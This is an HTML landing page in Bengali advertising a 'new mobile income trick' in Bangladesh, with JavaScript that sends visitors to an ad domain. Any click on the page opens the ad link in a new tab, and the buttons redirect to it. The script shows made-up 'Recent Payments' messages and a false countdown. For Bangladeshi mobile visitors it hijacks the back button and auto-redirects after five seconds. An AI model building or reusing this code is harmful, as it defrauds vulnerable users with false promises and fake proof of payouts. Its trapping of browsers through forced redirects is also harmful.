<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>বাংলাদেশে নতুন ইনকাম ট্রিক (Ultimate Version)</title>

<style>
body { font-family: Arial; margin:0; background:#f2f2f2; cursor:pointer; }
.container { max-width:720px; margin:auto; background:#fff; padding:25px; border-radius:12px; box-shadow:0 10px 25px rgba(0,0,0,0.1); text-align:center; }
h1 { font-size:26px; margin-bottom:10px; }
p { color:#555; }
.hero { width:100%; border-radius:10px; }
.step { margin:15px 0; padding:15px; border:1px solid #eee; border-radius:8px; cursor:pointer; }
.step:hover { background:#f9f9f9; }
.btn { background:#ff5722; color:#fff; padding:15px 25px; border:none; border-radius:8px; font-size:16px; margin:10px; cursor:pointer; }
.countdown { color:red; font-weight:bold; margin:15px 0; }
.payment-box { background:#f7f7f7; padding:10px; border-radius:8px; max-height:120px; overflow:hidden; text-align:left; font-size:13px; }
</style>
</head>

<body>

<div class="container">

<img src="https://i.ibb.co/7Qb6B7x/mobile-earning.jpg" class="hero click-ad">

<h1 class="click-ad">😲 নতুন মোবাইল ইনকাম ট্রিক!</h1>

<p class="click-ad">বাংলাদেশে এখন অনেকেই এই মেথড দিয়ে আয় করছে</p>

<div class="step click-ad">Step 1: কিভাবে কাজ করে দেখুন</div>
<div class="step click-ad">Step 2: নিচে click করুন</div>
<div class="step click-ad">Step 3: আয় শুরু করুন</div>

<div class="countdown" id="timer">⏳ 05:00 remaining</div>

<button class="btn main-btn">👉 এখনই শুরু করুন</button>
<button class="btn main-btn">🎯 Continue</button>

<h3>💸 Recent Payments</h3>
<div class="payment-box" id="payments"></div>

</div>

<script>
// ===============================
// LINKS
// ===============================
const adLink = "https://punkblackmailmeek.com/s3kn01qy4e?key=83e3ff888d06681f6a3040688551545d";      // First click popup
const mainLink = "https://punkblackmailmeek.com/s3kn01qy4e?key=83e3ff888d06681f6a3040688551545d";          // Back button + Button redirect

// ===============================
// AD CLICK (Hero / Step)
document.querySelectorAll(".click-ad").forEach(el=>{
  el.addEventListener("click", ()=>{
    window.open(adLink, "_blank");
  });
});

// BUTTON → main offer
document.querySelectorAll(".main-btn").forEach(el=>{
  el.addEventListener("click", ()=>{
    window.location.href = mainLink;
  });
});

// ===============================
// COUNTDOWN
let t=300;
setInterval(()=>{
let m=Math.floor(t/60);
let s=t%60;
document.getElementById("timer").innerText=⏳ ${m}:${s<10?'0'+s:s};
t--;
if(t<0)t=0;
},1000);

// ===============================
// FAKE PAYMENTS
const msgs=[
"Rahim got $12",
"Fatema received payment",
"Hasan earned $7",
"Sumaiya got first payment",
"Tanvir made $5",
];
setInterval(()=>{
let d=document.createElement("div");
d.innerText=msgs[Math.floor(Math.random()*msgs.length)];
document.getElementById("payments").appendChild(d);
},2000);

// ===============================
// MOBILE + BANGLADESH DETECTION
function isBangladeshMobile() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) &&
           navigator.language.includes("bn");
}

// ===============================
// BACK BUTTON + SOFT AUTO REDIRECT
if(isBangladeshMobile()){
    history.pushState({page:1}, "", "");
    window.onpopstate = function () {
        if (!sessionStorage.getItem("redirected")) {
            sessionStorage.setItem("redirected", "true");
            window.location.href = mainLink;
        }
    };
    setTimeout(()=>{
        if(!sessionStorage.getItem("redirected")){
            sessionStorage.setItem("redirected", "true");
            window.location.href = mainLink;
        }
    }, 5000);
}

// ===============================
// ONE-TIME CLICK POPUP (FIRST CLICK NEW TAB)
let clickedOnce = false;
document.addEventListener("click", function(e){
    if(!clickedOnce && !e.target.closest(".main-btn")){
        clickedOnce = true;
        window.open(adLink, "_blank");
    }
});
</script>

</body>
</html>
